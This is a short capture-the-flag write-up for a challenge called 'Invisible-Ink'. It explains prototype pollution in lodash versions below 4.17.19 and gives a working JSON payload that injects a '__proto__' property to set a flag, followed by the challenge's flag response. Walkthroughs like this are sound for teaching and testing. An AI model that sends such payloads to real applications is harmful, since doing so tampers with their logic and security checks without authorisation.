
# Invisible-Ink

Expose hidden vulnerabilities in the web application.

## Objective 

The objective of this CTF is to explore the **Prototype Pollution vulnerability** that exists in the versions **below 4.17.19** of **lodash**. 

## Exploring the challenge

In this challenge we were provided with two files, a *package.json* and a *index.js*. It's a pretty simple project.
At first sight, the *index.js* file already contains something that can give us a hint of what we need to do, in this case, try to manipulate a runtime variable. We can tell that because at the line 27 we have a check on a object initialized at the line 9, but with the used key never set.

By looking at the *package.json*, if you already have seen the lodash vulnerability before, you can easily tell that the version choosed for this project was below the version with the patch, so now we can look up on ways to explore this vulnerability.

## Solution

The solution is pretty simple. As explained [here](https://motion-software.com/blog/prototype-pollution-in-lodash), we can pass a value in the json called *"_proto_"* and create or manipulate variables inside this object. So I came up this simple payload for the echo API.
```json
{
    "message": "ping", 
    "__proto__": {
        "flag": true
    }
}
```

By sending that, you'll get the flag in the response.
```json
{
	"userID": "...",
	"time": "...",
	"message": "ping",
	"flag": "SNYK{THE FLAG HERO}"
}
```